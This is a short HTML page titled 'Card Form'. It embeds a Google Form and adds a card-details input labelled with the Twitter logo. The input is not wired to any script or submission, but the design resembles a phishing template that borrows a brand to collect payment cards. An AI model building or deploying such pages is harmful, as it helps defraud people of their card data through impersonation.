<!DOCTYPE html>
<html>
<head>
  <title>Card Form</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background: #f0f0f0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .card {
      position: relative;
      width: 420px;
      height: 820px; /* adjusted for form */
      background-color: #000000; /* black background */
      border-radius: 20px;
      padding: 20px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
      color: white;
      overflow: hidden;
      display: flex;
      flex-direction: column;
    }

    .card iframe {
      width: 100%;
      flex: 1; /* fill remaining space */
      border: none;
      border-radius: 12px;
      margin-bottom: 15px;
    }

    /* Debit card input bar style */
    .debit-bar {
      display: flex;
      align-items: center;
      background-color: #111111; /* slightly lighter black */
      border-radius: 10px;
      padding: 12px 15px;
      box-sizing: border-box;
    }

    .debit-bar img {
      height: 24px;
      width: 24px;
      margin-right: 12px;
      filter: invert(100%); /* make logo white on black */
    }

    .debit-bar input {
      flex: 1;
      background: transparent;
      border: none;
      color: white;
      font-size: 16px;
      outline: none;
    }

  </style>
</head>
<body>

<div class="card">
  <iframe 
    src="https://docs.google.com/forms/d/e/1FAIpQLSeLOQkeADnMfApi9CY7nVq9wf-mj8Ljsm8VLbbjIO6Rg0y3AQ/viewform?embedded=true"
    width="100%" 
    height="100%" 
    frameborder="0" 
    marginheight="0" 
    marginwidth="0">
    Loading…
  </iframe>

  <!-- Debit card input bar -->
  <div class="debit-bar">
    <img src="https://upload.wikimedia.org/wikipedia/en/6/60/Twitter_Logo_as_of_2021.svg" alt="Twitter Logo">
    <input type="text" placeholder="Enter card details">
  </div>
</div>

</body>
</html>
